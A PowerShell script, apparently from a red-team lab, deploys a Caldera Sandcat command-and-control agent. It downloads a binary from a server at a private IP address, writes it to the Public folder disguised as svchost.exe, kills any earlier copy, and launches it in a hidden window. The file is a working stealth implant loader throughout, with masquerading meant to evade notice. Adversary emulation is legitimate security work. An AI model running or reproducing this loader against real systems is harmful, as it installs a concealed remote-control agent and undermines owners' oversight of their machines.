# Caldera Sandcat Agent Deployment Script
# Updated to use svchost.exe masquerading
# Version: 1.0 - Stealth deployment

# Configuration
$server = "http://192.168.124.133:8888"
$url = "$server/file/download"

# Create web client
$wc = New-Object System.Net.WebClient
$wc.Headers.add("platform", "windows")
$wc.Headers.add("file", "sandcat.go")

# Download agent
Write-Host "[*] Downloading Sandcat agent..." -ForegroundColor Cyan
$data = $wc.DownloadData($url)

# Kill existing svchost.exe processes in Public folder
Write-Host "[*] Checking for existing agent..." -ForegroundColor Cyan
Get-Process | Where-Object {$_.modules.filename -like "C:\Users\Public\svchost.exe"} | Stop-Process -Force -ErrorAction SilentlyContinue

# Remove old file
Remove-Item -Force "C:\Users\Public\svchost.exe" -ErrorAction SilentlyContinue

# Write new agent
Write-Host "[*] Deploying agent as svchost.exe..." -ForegroundColor Cyan
[io.file]::WriteAllBytes("C:\Users\Public\svchost.exe", $data) | Out-Null

# Start agent
Write-Host "[+] Starting agent (hidden)..." -ForegroundColor Green
Start-Process -FilePath "C:\Users\Public\svchost.exe" -ArgumentList "-server $server -group red" -WindowStyle Hidden

Write-Host "[+] Agent deployed successfully!" -ForegroundColor Green
Write-Host "[i] Agent location: C:\Users\Public\svchost.exe" -ForegroundColor Yellow
Write-Host "[i] Server: $server" -ForegroundColor Yellow
